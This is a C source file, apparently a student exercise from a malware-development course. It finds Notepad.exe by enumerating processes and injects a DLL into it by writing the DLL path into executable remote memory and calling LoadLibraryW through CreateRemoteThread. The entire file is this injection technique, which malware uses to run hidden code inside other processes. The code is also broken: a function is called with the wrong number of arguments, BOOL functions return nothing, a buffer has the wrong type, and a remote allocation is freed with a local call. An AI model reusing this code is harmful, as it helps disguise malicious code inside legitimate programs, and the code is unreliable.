#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <Psapi.h>


BOOL ProcessScanning(HANDLE *hprocess,LPWSTR processname);
BOOL DllInjectionOnRemoteProcess(HANDLE hprocess, LPWSTR DllPath, SIZE_T szDllPath);



int main() {

	HANDLE hprocess = NULL;
	LPWSTR Dllpath= L"C:\\Users\\ACER\\Desktop\\devm\\hackingwithmaldevacademy\\x64\\Debug\\hackingwithmaldevacademy.dll";
	LPWSTR processname = L"Notepad.exe";
	SIZE_T szDllPath =lstrlenW(Dllpath) * sizeof(WCHAR);

	




	ProcessScanning(&hprocess,processname,processname);
	DllInjectionOnRemoteProcess(hprocess,Dllpath,szDllPath);
	





	printf("press <enter> to exit");
	getchar();


}

BOOL DllInjectionOnRemoteProcess(HANDLE hprocess,LPWSTR DllPath,SIZE_T szDllPath) {

	LPVOID ploadlibraryw  = (GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW"));

	LPVOID paddress = VirtualAllocEx(hprocess, NULL, szDllPath, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (paddress == NULL) {
		printf("The virtual alloc failed with error no %d", GetLastError());

	}

	else {
		printf("process allocated at 0x%lp\n", paddress);
		SIZE_T wriitenvalue = NULL;
		if (WriteProcessMemory(hprocess, paddress, DllPath, szDllPath, &wriitenvalue) == 0 || szDllPath != wriitenvalue) {
			printf("The write process hasn't been wrtten %d\n", GetLastError());

		}

		else
		{

			printf("hello world\n");
			getchar();
			printf("the loadlibraryw is present at %lp\n", ploadlibraryw);
		HANDLE hthread = CreateRemoteThread(hprocess, NULL, NULL, ploadlibraryw, paddress, NULL, NULL);

		if (hthread == NULL) {
			printf("The createremotethread failed with error no %d", GetLastError());

		}
		VirtualFree(paddress, szDllPath, MEM_RELEASE);
		CloseHandle(hprocess);
		
			
		}
	}









}


BOOL ProcessScanning(HANDLE *hprocess,LPWSTR processname) {

	DWORD pids[1024 * 2];
	DWORD returnvalue = NULL;
	DWORD noofpids = NULL;
	DWORD processnames[MAX_PATH];


	if (EnumProcesses(pids, sizeof(pids), &returnvalue) != 0) {

		noofpids = returnvalue / sizeof(DWORD);

		for (DWORD i = 0; i < noofpids; i++) {
			
			*hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pids[i]);

			if (*hprocess == NULL) {
				printf("printf open process failed with error no %d\n", GetLastError());

				}

			else {

				memset(processnames, 0, sizeof(processnames));

				if(GetModuleBaseName(*hprocess, NULL, processnames, MAX_PATH) ==  0) {

					printf("the get moduel base name failed with error no %d", GetLastError());
				}
				else {

					//processnames[MAX_PATH-1]=L"\0";
					printf("%ls\n", processnames);
					// know about this
					if (wcscmp(processnames, processname) == 0 ) {

						printf("found process at pid %ld", pids[i]);

						break;
					}
					else {
						printf(".\n");
					}
				}


			}

		}




	}
	else {
		printf("The enumprocesses failed with error no %d", GetLastError());
	}





}
















